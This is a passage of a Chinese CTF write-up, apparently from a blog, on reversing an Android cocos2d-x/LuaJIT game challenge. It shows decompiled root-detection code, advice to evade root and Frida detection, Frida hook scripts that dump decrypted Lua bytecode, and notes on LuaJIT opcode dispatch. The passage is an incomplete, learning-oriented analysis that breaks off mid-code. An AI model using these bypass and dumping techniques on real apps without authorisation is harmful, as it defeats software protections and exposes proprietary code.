<span class="comment">/* JADX WARNING: Code restructure failed: missing block: B:16:0x0020, code lost:</span></span><br><span class="line"><span class="comment">        return false;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">/* JADX WARNING: Exception block dominator not found, dom blocks: [] */</span></span><br><span class="line">    <span class="comment">/* Code decompiled incorrectly, please refer to instructions dump. */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="type">boolean</span> <span class="title function_">f</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            java.lang.Class&lt;org.cocos2dx.lib.Cocos2dxUtil&gt; r0 = org.cocos2dx.lib.Cocos2dxUtil.class</span></span><br><span class="line"><span class="comment">            monitor-enter(r0)</span></span><br><span class="line"><span class="comment">            r1 = 0</span></span><br><span class="line"><span class="comment">            java.lang.String r2 = &quot;test_ok&quot;</span></span><br><span class="line"><span class="comment">            java.lang.String r3 = &quot;/data/su_test&quot;</span></span><br><span class="line"><span class="comment">            h(r3, r2)     // Catch:&#123; Exception -&gt; 0x001f, all -&gt; 0x001c &#125;</span></span><br><span class="line"><span class="comment">            java.lang.String r3 = &quot;/data/su_test&quot;</span></span><br><span class="line"><span class="comment">            java.lang.String r3 = i(r3)     // Catch:&#123; Exception -&gt; 0x001f, all -&gt; 0x001c &#125;</span></span><br><span class="line"><span class="comment">            boolean r2 = r2.equals(r3)     // Catch:&#123; Exception -&gt; 0x001f, all -&gt; 0x001c &#125;</span></span><br><span class="line"><span class="comment">            if (r2 == 0) goto L_0x001a</span></span><br><span class="line"><span class="comment">            r1 = 1</span></span><br><span class="line"><span class="comment">            monitor-exit(r0)</span></span><br><span class="line"><span class="comment">            return r1</span></span><br><span class="line"><span class="comment">        L_0x001a:</span></span><br><span class="line"><span class="comment">            monitor-exit(r0)</span></span><br><span class="line"><span class="comment">            return r1</span></span><br><span class="line"><span class="comment">        L_0x001c:</span></span><br><span class="line"><span class="comment">            r1 = move-exception</span></span><br><span class="line"><span class="comment">            monitor-exit(r0)</span></span><br><span class="line"><span class="comment">            throw r1</span></span><br><span class="line"><span class="comment">        L_0x001f:</span></span><br><span class="line"><span class="comment">            monitor-exit(r0)</span></span><br><span class="line"><span class="comment">            return r1</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Method not decompiled: org.cocos2dx.lib.Cocos2dxUtil.f():boolean&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX DE<span class="doctag">BUG:</span> Failed to insert an additional move for type inference into block B:51:? */</span></span><br><span class="line">    <span class="comment">/* JADX DE<span class="doctag">BUG:</span> Failed to insert an additional move for type inference into block B:43:0x0050 */</span></span><br><span class="line">    <span class="comment">/* JADX DE<span class="doctag">BUG:</span> Multi-variable search result rejected for r1v0, resolved type: boolean */</span></span><br><span class="line">    <span class="comment">/* JADX DE<span class="doctag">BUG:</span> Multi-variable search result rejected for r1v1, resolved type: boolean */</span></span><br><span class="line">    <span class="comment">/* JADX DE<span class="doctag">BUG:</span> Multi-variable search result rejected for r1v2, resolved type: boolean */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Multi-variable type inference failed */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r1v3, types: [java.lang.Throwable] */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r1v8 */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r1v9 */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r1v10 */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r1v11 */</span></span><br><span class="line">    <span class="comment">/* JADX WARNING: Can&#x27;t wrap try/catch for region: R(5:30|(0)|36|37|38) */</span></span><br><span class="line">    <span class="comment">/* JADX WARNING: Code restructure failed: missing block: B:45:0x0054, code lost:</span></span><br><span class="line"><span class="comment">        r1 = move-exception;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">/* JADX WARNING: Code restructure failed: missing block: B:49:0x005b, code lost:</span></span><br><span class="line"><span class="comment">        throw r1;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">/* JADX WARNING: Failed to process nested try/catch */</span></span><br><span class="line">    <span class="comment">/* JADX WARNING: Missing exception handler attribute for start block: B:37:0x004c */</span></span><br><span class="line">    <span class="comment">/* JADX WARNING: Removed duplicated region for block: B:34:0x0046 A[SYNTHETIC, Splitter:B:34:0x0046] */</span></span><br><span class="line">    <span class="comment">/* JADX WARNING: Removed duplicated region for block: B:43:0x0050 A[SYNTHETIC, Splitter:B:43:0x0050] */</span></span><br><span class="line">    <span class="comment">/* Code decompiled incorrectly, please refer to instructions dump. */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="type">boolean</span> <span class="title function_">g</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            java.lang.Class&lt;org.cocos2dx.lib.Cocos2dxUtil&gt; r0 = org.cocos2dx.lib.Cocos2dxUtil.class</span></span><br><span class="line"><span class="comment">            monitor-enter(r0)</span></span><br><span class="line"><span class="comment">            r1 = 0</span></span><br><span class="line"><span class="comment">            r2 = 0</span></span><br><span class="line"><span class="comment">            java.lang.Runtime r3 = java.lang.Runtime.getRuntime()     // Catch:&#123; Exception -&gt; 0x004d, all -&gt; 0x0042 &#125;</span></span><br><span class="line"><span class="comment">            java.lang.String r4 = &quot;su&quot;</span></span><br><span class="line"><span class="comment">            java.lang.Process r3 = r3.exec(r4)     // Catch:&#123; Exception -&gt; 0x004d, all -&gt; 0x0042 &#125;</span></span><br><span class="line"><span class="comment">            java.io.DataOutputStream r4 = new java.io.DataOutputStream     // Catch:&#123; Exception -&gt; 0x004e, all -&gt; 0x0040 &#125;</span></span><br><span class="line"><span class="comment">            java.io.OutputStream r5 = r3.getOutputStream()     // Catch:&#123; Exception -&gt; 0x004e, all -&gt; 0x0040 &#125;</span></span><br><span class="line"><span class="comment">            r4.&lt;init&gt;(r5)     // Catch:&#123; Exception -&gt; 0x004e, all -&gt; 0x0040 &#125;</span></span><br><span class="line"><span class="comment">            java.lang.String r2 = &quot;exit\n&quot;</span></span><br><span class="line"><span class="comment">            r4.writeBytes(r2)     // Catch:&#123; Exception -&gt; 0x003e, all -&gt; 0x003b &#125;</span></span><br><span class="line"><span class="comment">            r4.flush()     // Catch:&#123; Exception -&gt; 0x003e, all -&gt; 0x003b &#125;</span></span><br><span class="line"><span class="comment">            int r2 = r3.waitFor()     // Catch:&#123; Exception -&gt; 0x003e, all -&gt; 0x003b &#125;</span></span><br><span class="line"><span class="comment">            if (r2 != 0) goto L_0x0031</span></span><br><span class="line"><span class="comment">            r1 = 1</span></span><br><span class="line"><span class="comment">            if (r4 == 0) goto L_0x002c</span></span><br><span class="line"><span class="comment">            r4.close()     // Catch:&#123; Exception -&gt; 0x002f &#125;</span></span><br><span class="line"><span class="comment">        L_0x002c:</span></span><br><span class="line"><span class="comment">            r3.destroy()     // Catch:&#123; Exception -&gt; 0x002f &#125;</span></span><br><span class="line"><span class="comment">        L_0x002f:</span></span><br><span class="line"><span class="comment">            monitor-exit(r0)</span></span><br><span class="line"><span class="comment">            return r1</span></span><br><span class="line"><span class="comment">        L_0x0031:</span></span><br><span class="line"><span class="comment">            if (r4 == 0) goto L_0x0036</span></span><br><span class="line"><span class="comment">            r4.close()     // Catch:&#123; Exception -&gt; 0x0039 &#125;</span></span><br><span class="line"><span class="comment">        L_0x0036:</span></span><br><span class="line"><span class="comment">            r3.destroy()     // Catch:&#123; Exception -&gt; 0x0039 &#125;</span></span><br><span class="line"><span class="comment">        L_0x0039:</span></span><br><span class="line"><span class="comment">            monitor-exit(r0)</span></span><br><span class="line"><span class="comment">            return r1</span></span><br><span class="line"><span class="comment">        L_0x003b:</span></span><br><span class="line"><span class="comment">            r1 = move-exception</span></span><br><span class="line"><span class="comment">            r2 = r4</span></span><br><span class="line"><span class="comment">            goto L_0x0044</span></span><br><span class="line"><span class="comment">        L_0x003e:</span></span><br><span class="line"><span class="comment">            r2 = r4</span></span><br><span class="line"><span class="comment">            goto L_0x004e</span></span><br><span class="line"><span class="comment">        L_0x0040:</span></span><br><span class="line"><span class="comment">            r1 = move-exception</span></span><br><span class="line"><span class="comment">            goto L_0x0044</span></span><br><span class="line"><span class="comment">        L_0x0042:</span></span><br><span class="line"><span class="comment">            r1 = move-exception</span></span><br><span class="line"><span class="comment">            r3 = r2</span></span><br><span class="line"><span class="comment">        L_0x0044:</span></span><br><span class="line"><span class="comment">            if (r2 == 0) goto L_0x0049</span></span><br><span class="line"><span class="comment">            r2.close()     // Catch:&#123; Exception -&gt; 0x004c &#125;</span></span><br><span class="line"><span class="comment">        L_0x0049:</span></span><br><span class="line"><span class="comment">            r3.destroy()     // Catch:&#123; Exception -&gt; 0x004c &#125;</span></span><br><span class="line"><span class="comment">        L_0x004c:</span></span><br><span class="line"><span class="comment">            throw r1     // Catch:&#123; all -&gt; 0x0054 &#125;</span></span><br><span class="line"><span class="comment">        L_0x004d:</span></span><br><span class="line"><span class="comment">            r3 = r2</span></span><br><span class="line"><span class="comment">        L_0x004e:</span></span><br><span class="line"><span class="comment">            if (r2 == 0) goto L_0x0056</span></span><br><span class="line"><span class="comment">            r2.close()     // Catch:&#123; Exception -&gt; 0x005c &#125;</span></span><br><span class="line"><span class="comment">            goto L_0x0056</span></span><br><span class="line"><span class="comment">        L_0x0054:</span></span><br><span class="line"><span class="comment">            r1 = move-exception</span></span><br><span class="line"><span class="comment">            goto L_0x005a</span></span><br><span class="line"><span class="comment">        L_0x0056:</span></span><br><span class="line"><span class="comment">            r3.destroy()     // Catch:&#123; Exception -&gt; 0x005c &#125;</span></span><br><span class="line"><span class="comment">            goto L_0x005c</span></span><br><span class="line"><span class="comment">        L_0x005a:</span></span><br><span class="line"><span class="comment">            monitor-exit(r0)</span></span><br><span class="line"><span class="comment">            throw r1</span></span><br><span class="line"><span class="comment">        L_0x005c:</span></span><br><span class="line"><span class="comment">            monitor-exit(r0)</span></span><br><span class="line"><span class="comment">            return r1</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Method not decompiled: org.cocos2dx.lib.Cocos2dxUtil.g():boolean&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Boolean <span class="title function_">h</span><span class="params">(String str, String str2)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(str);</span><br><span class="line">            fileOutputStream.write(str2.getBytes());</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">i</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(str));</span><br><span class="line">            <span class="type">byte</span>[] bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">read</span> <span class="operator">=</span> fileInputStream.read(bArr);</span><br><span class="line">                <span class="keyword">if</span> (read &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">                &#125;</span><br><span class="line">                byteArrayOutputStream.write(bArr, <span class="number">0</span>, read);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ArrayList&lt;String&gt; <span class="title function_">j</span><span class="params">(String[] strArr)</span> &#123;</span><br><span class="line">        ArrayList&lt;String&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">exec</span> <span class="operator">=</span> Runtime.getRuntime().exec(strArr);</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(exec.getOutputStream()));</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(exec.getInputStream()));</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">readLine</span> <span class="operator">=</span> bufferedReader.readLine();</span><br><span class="line">                    <span class="keyword">if</span> (readLine == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    arrayList.add(readLine);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception unused) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> arrayList;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception unused2) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">lowEngineVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a() || b() || c() || d() || e() || f() || g();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如何绕过root检测，如果不绕过是没法用root手机打开的，只需要面具里装shamiko插件就行：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/541299125">https://zhuanlan.zhihu.com/p/541299125</a></p>
<p>在native层中存在pthread_create检查是否有idaserver和frida server。</p>
<p>这个题显然是用cocos2d-x引擎和lua开发的，这个游戏是将flag输对才能通关。传统的cocos2d-x luac加密是xxtea，密钥很好找，而这个题修改了源码，加密不一样了。一般cocos-x游戏脚本被存放在asserts&#x2F;src目录下，但是该目录下文件名称全部被加密了。</p>
<p>如何将luajit编译成arm架构的libluajit.so呢？</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/LuaJIT/</span>LuaJIT.git</span><br><span class="line">cd LuaJIT</span><br><span class="line">git checkout v2.<span class="number">1.0</span>-beta3</span><br><span class="line">make -j `nproc`</span><br></pre></td></tr></table></figure>

<p>然后生成的lib.so文件在src目录中，用bindiff还原函数名称，发现lua加载函数<em>luaL_loadbuffer</em> 的地址为 0xAC4E9C，该函数的原型为 <code>LUALIB_API int luaL_loadbuffer(lua_State *L, const char *buf, size_t size, const char *name)</code>，第二个参数指向当前加载字节码文件的二进制内容，第三个参数指明 buf 的大小，第四个参数为模块路径名。</p>
<p>采用hook该函数，打印第四个参数，可以获得加载的lua模块路径名</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> lib_base = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libgame.so&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(lib_base.<span class="title function_">add</span>(<span class="number">0xAC4E9C</span>), &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> chunk_name = args[<span class="number">3</span>].<span class="title function_">readCString</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Load: &quot;</span> + chunk_name);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>) &#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Load</span>: scene/GameScene.pyc</span><br><span class="line"><span class="built_in">Load</span>: core/GameMap.pyc</span><br><span class="line"><span class="built_in">Load</span>: entity/<span class="built_in">Enemy</span>.pyc</span><br><span class="line"><span class="built_in">Load</span>: entity/Mario.pyc</span><br></pre></td></tr></table></figure>

<p>中间遇到了很多问题，还没解决。</p>
<p>把加载的文件dump出来：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> base_dir = <span class="string">&quot;/data/data/cn.org.xctf.flagio/&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> lib_base = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libgame.so&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(lib_base.<span class="title function_">add</span>(<span class="number">0xAC4E9C</span>), &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> chunk = args[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">var</span> chunk_size = args[<span class="number">2</span>].<span class="title function_">toInt32</span>();</span><br><span class="line">        <span class="keyword">var</span> chunk_name = args[<span class="number">3</span>].<span class="title function_">readCString</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> new_name = chunk_name.<span class="title function_">slice</span>(chunk_name.<span class="title function_">lastIndexOf</span>(<span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>, -<span class="number">3</span>) + <span class="string">&quot;luac64&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="keyword">new</span> <span class="title class_">File</span>(base_dir + new_name, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">        file.<span class="title function_">write</span>(chunk.<span class="title function_">readByteArray</span>(chunk_size));</span><br><span class="line">        file.<span class="title function_">close</span>();</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>) &#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>然后发现这五个lua文件全部是64位luadjit文件，前面已经了解了如何反编译，但是这个题不能直接反编译，因为luajit加载函数改变了，该题是将Luajit中的opcode顺序进行了修改，如何在native层中识别并且还原出引擎的opcode顺序就成为了主要目标。</p>
<p>在lj_obj.h中，可以找到lua_State结构体定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Per-thread state object. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lua_State</span> &#123;</span></span><br><span class="line">  GCHeader;</span><br><span class="line">  <span class="type">uint8_t</span> dummy_ffid;	<span class="comment">/* Fake FF_C for curr_funcisL() on dummy frames. */</span></span><br><span class="line">  <span class="type">uint8_t</span> status;	<span class="comment">/* Thread status. */</span></span><br><span class="line">  MRef glref;		<span class="comment">/* Link to global state. */</span></span><br><span class="line">  GCRef gclist;		<span class="comment">/* GC chain. */</span></span><br><span class="line">  TValue *base;		<span class="comment">/* Base of currently executing function. */</span></span><br><span class="line">  TValue *top;		<span class="comment">/* First free slot in the stack. */</span></span><br><span class="line">  MRef maxstack;	<span class="comment">/* Last free slot in the stack. */</span></span><br><span class="line">  MRef <span class="built_in">stack</span>;		<span class="comment">/* Stack base. */</span></span><br><span class="line">  GCRef openupval;	<span class="comment">/* List of open upvalues in the stack. */</span></span><br><span class="line">  GCRef env;		<span class="comment">/* Thread environment (table of globals). */</span></span><br><span class="line">  <span class="type">void</span> *cframe;		<span class="comment">/* End of C stack frame chain. */</span></span><br><span class="line">  MSize stacksize;	<span class="comment">/* True stack size (incl. LJ_STACK_EXTRA). */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>glref字段，这个字段指向了globle_State结构体，保存着luajit全局信息，通过这个可以找到GG_State结构体，这个结构体保存着dispatch字段，这个字段是一个数组，这个数组维护luajit内部指令跳转表，每条luajit虚拟机指令都能在这个数组中找到对应处理，这个GG_State在lj_dispatch.h头文件中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Global state, main thread and extra fields are allocated together. */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">GG_State</span> &#123;</span></span><br><span class="line">  lua_State L;				<span class="comment">/* Main thread. */</span></span><br><span class="line">  global_State g;			<span class="comment">/* Global state. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LJ_TARGET_MIPS</span></span><br><span class="line">  ASMFunction got[LJ_GOT__MAX];		<span class="comment">/* Global offset table. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LJ_HASJIT</span></span><br><span class="line">  jit_State J;				<span class="comment">/* JIT state. */</span></span><br><span class="line">  HotCount hotcount[HOTCOUNT_SIZE];	<span class="comment">/* Hot counters. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  ASMFunction dispatch[GG_LEN_DISP];	<span class="comment">/* Instruction dispatch tables. */</span></span><br><span class="line">  BCIns bcff[GG_NUM_ASMFF];		<span class="comment">/* Bytecode for ASM fast functions. */</span></span><br><span class="line">&#125; GG_State;</span><br></pre></td></tr></table></figure>

<p>lua_loadbuffer函数是加载运行luajit字节码的，所以</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">LUALIB_API <span class="type">int</span> <span class="title function_">luaL_loadbuffer</span><span class="params">(lua_State *L, <span class="type">const</span> <span class="type">char</span> *buf, <span class="type">size_t</span> size,</span></span><br><span class="line"><span class="params">			       <span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> luaL_loadbufferx(L, buf, size, name, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LUALIB_API <span class="type">int</span> <span class="title function_">luaL_loadbufferx</span><span class="params">(lua_State *L, <span class="type">const</span> <span class="type">char</span> *buf, <span class="type">size_t</span> size,</span></span><br><span class="line"><span class="params">				<span class="type">const</span> <span class="type">char</span> *name, <span class="type">const</span> <span class="type">char</span> *mode)</span></span><br><span class="line">&#123;</span><br><span class="line">  StringReaderCtx ctx;</span><br><span class="line">  ctx.str = buf;</span><br><span class="line">  ctx.size = size;</span><br><span class="line">  <span class="keyword">return</span> lua_loadx(L, reader_string, &amp;ctx, name, mode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LUA_API <span class="type">int</span> <span class="title function_">lua_loadx</span><span class="params">(lua_State *L, lua_Reader reader, <span class="type">void</span> *data,</span></span><br><span class="line"><span class="params">		      <span class="type">const</span> <span class="type">char</span> *chunkname, <span class="type">const</span> <span class="type">char</span> *mode)</span></span><br><span class="line">&#123;</span><br><span class="line">  LexState ls;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  ls.rfunc = reader;</span><br><span class="line">  ls.rdata = data;</span><br><span class="line">  ls.chunkarg = chunkname ? chunkname : <span class="string">&quot;?&quot;</span>;</span><br><span class="line">  ls.mode = mode;</span><br><span class="line">  lj_buf_init(L, &amp;ls.sb);</span><br><span class="line">  status = lj_vm_cpcall(L, <span class="literal">NULL</span>, &amp;ls, cpparser);</span><br><span class="line">  lj_lex_cleanup(L, &amp;ls);</span><br><span class="line">  lj_gc_check(L);</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先在调用lua_loadx前会保存当前变量和长度，然后通过调用lj_vm_cpcall函数来启动虚拟机。但接下来是比较难分析的，因为该函数是汇编写法，总之，该汇编基本原理如下：</p>
<p>取指令通过<code>ldr INSw, [PC], #4</code> 实现，PC和INSw定义在文件头，对应x21和x16寄存器。这句汇编的意思就是从 x21 指向的空间里取来 32 bits 存放到 x16 的低四字节，然后 x21 自增 4（指向下一条指令），由此也可以得知 LuaJIT 采用定长指令集，每条指令长度为 4 字节。</p>
<p>译码主要操作是<code>decode_RA RA, INS</code> 宏和 <code>add RA, BASE, RA, lsl #3</code> 来解析操作数，然后跳转地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add TMP1, GL, INS, uxtb #<span class="number">3</span>          x9 = x22 + (((<span class="type">unsigned</span> <span class="type">int</span>)(x16 &amp; <span class="number">0xFF</span>)) &lt;&lt; <span class="number">3</span>)</span><br><span class="line">ldr TMP0, [TMP1, #GG_G2DISP]       x9 加上常数 #GG_G2DISP 后指向的地址空间里取出 <span class="number">8</span> 字节放到 x8</span><br><span class="line">br TMP0            跳转到处理例程去执行</span><br></pre></td></tr></table></figure>

<p>这里的 TMP0 和 TMP1 分别是 x8 和 x9 寄存器，INS 就是 x16 寄存器。</p>
<p>其中 <em>GG_G2DISP</em> 定义在 <code>lj_dispatch.h</code> 中：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C</span><br><span class="line">typedef struct GG_State &#123;</span><br><span class="line">  ...</span><br><span class="line">  global_State g;			<span class="comment">/* Global state. */</span></span><br><span class="line">  ...</span><br><span class="line">  ASMFunction dispatch<span class="selector-attr">[GG_LEN_DISP]</span>;	<span class="comment">/* Instruction dispatch tables. */</span></span><br><span class="line">  ...</span><br><span class="line">&#125; GG_State;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#define</span> <span class="built_in">GG_OFS</span>(field)	((int)<span class="built_in">offsetof</span>(GG_State, field))</span><br><span class="line"><span class="selector-id">#define</span> GG_G2DISP	(GG_OFS(dispatch) - <span 